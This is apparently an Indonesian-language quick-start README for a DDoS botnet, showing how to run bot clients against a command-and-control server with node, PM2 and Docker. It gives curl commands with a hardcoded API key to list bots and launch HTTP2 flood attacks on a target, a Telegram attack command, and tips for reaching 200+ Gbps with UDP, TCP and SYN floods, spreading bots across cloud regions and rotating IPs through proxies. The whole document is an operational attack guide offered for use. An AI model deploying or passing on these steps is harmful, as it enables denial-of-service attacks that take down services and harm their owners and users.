# ⚡ Quick Deploy - Simple Bot

Deploy bots dalam **3 menit**!

## 🚀 Method 1: Single Bot (Paling Simple!)

```bash
# 1. Install dependencies (sekali aja)
npm install axios socket.io-client

# 2. Run bot
node simple-bot.js https://your-c2-server.com
```

**DONE!** Bot sudah jalan! 🎉

---

## 🔥 Method 2: Multiple Bots (10-100 bots)

```bash
# 1. Install PM2 (sekali aja)
npm install -g pm2

# 2. Deploy 50 bots sekaligus!
chmod +x deploy-bots.sh
./deploy-bots.sh 50 https://your-c2-server.com

# 3. Monitor
pm2 monit
```

**BOOM!** 50 bots langsung jalan! 💥

---

## 🌐 Method 3: Docker (Recommended untuk Scale!)

```bash
# 1. Build image
docker build -t simple-bot .

# 2. Run 100 containers!
for i in {1..100}; do
    docker run -d --name bot-$i \
        -e C2_URL=https://your-c2-server.com \
        simple-bot
done
```

**INSANE!** 100 bots dalam 1 menit! 🚀

---

## 📊 Check Bots di C2 Dashboard

```bash
# Via API
curl -H "Authorization: Bearer aryzz-c2-api-key-2024" \
    https://your-c2-server.com/api/bots

# Via browser
https://your-c2-server.com/dashboard
```

---

## 🎯 Launch Attack

### Via Telegram Bot
```
/attack https://target.com HTTP2 1000 60 10
```

### Via API
```bash
curl -X POST https://your-c2-server.com/api/attack/start \
    -H "Authorization: Bearer aryzz-c2-api-key-2024" \
    -H "Content-Type: application/json" \
    -d '{
        "target": "https://target.com",
        "method": "HTTP2",
        "threads": 1000,
        "duration": 60,
        "rpc": 10
    }'
```

---

## 🛑 Stop Bots

```bash
# Stop semua PM2 bots
pm2 delete all

# Stop Docker containers
docker stop $(docker ps -q --filter ancestor=simple-bot)
```

---

## 💡 Pro Tips

### Untuk 200+ Gbps seperti teman lu:

1. **Deploy 50-100 bots** ke server berbeda
2. **Gunakan Layer 4 methods**: UDP, TCP, SYN
3. **High threads**: 2000+ per bot
4. **High RPC**: 100+
5. **Monitor real-time**: `node monitor.js`

### Best Practices:

- ✅ Deploy ke multiple regions (AWS, GCP, Azure)
- ✅ Use PM2 untuk auto-restart
- ✅ Monitor dengan `pm2 monit`
- ✅ Rotate IPs dengan proxy
- ✅ Scale horizontal (banyak bots) > vertical (1 bot powerful)

---

## 🔥 Ready to Go!

Semua udah siap. Tinggal:
1. Deploy bots ✅
2. Launch attack ✅
3. Watch monitor ✅
4. Profit! 💰

**Dokumentasi lengkap:** `SIMPLE-BOT-GUIDE.md`
